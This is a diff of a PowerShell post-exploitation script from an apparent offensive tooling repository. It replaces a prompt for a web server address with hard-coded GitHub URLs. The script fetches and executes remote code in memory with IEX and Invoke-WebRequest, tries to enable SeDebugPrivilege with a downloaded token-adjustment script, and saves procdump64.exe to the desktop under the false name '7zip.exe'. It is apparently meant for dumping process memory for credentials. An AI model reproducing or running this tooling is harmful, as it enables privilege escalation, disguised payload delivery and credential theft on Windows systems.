@@ -3,11 +3,6 @@ IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thesc
 
 Write-Output "Script started"
 
-# Prompt for IP address and port of the web server
-$ipAddress = Read-Host -Prompt "Enter the IP address of the web server"
-$port = Read-Host -Prompt "Enter the port number of the web server"
-Write-Output "Using web server IP: $ipAddress and port: $port"
-
 # Function to check if SeDebugPrivilege is enabled for the current user
 function Check-SeDebugPrivilege {
     Write-Output "Checking SeDebugPrivilege..."
@@ -21,7 +16,7 @@ if (-not (Check-SeDebugPrivilege)) {
     Write-Output "SeDebugPrivilege not enabled; attempting to enable..."
 
     # Step 2: Download and execute adjust-token-privs.ps1 script in memory
-    $scriptUrl = "http://${ipAddress}:${port}/thescriptvault/privesc/windows/adjust-token-privs.ps1"
+    $scriptUrl = "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/adjust-token-privs.ps1"
     try {
         $scriptContent = (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content
         Write-Output "Downloaded adjust-token-privs.ps1 script content"
@@ -37,7 +32,7 @@ if (-not (Check-SeDebugPrivilege)) {
 
 # Step 3: Download procdump64.exe to the user's desktop
 try {
-    $procdumpUrl = "http://${ipAddress}:${port}/thescriptvault/privesc/windows/procdump64.exe"
+    $procdumpUrl = "https://github.com/paulkwalton/thescriptvault/raw/refs/heads/main/privesc/windows/procdump64.exe"
     $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "7zip.exe")
     Invoke-WebRequest -Uri $procdumpUrl -OutFile $desktopPath -UseBasicParsing
     Write-Output "7zip downloaded to: $desktopPath"
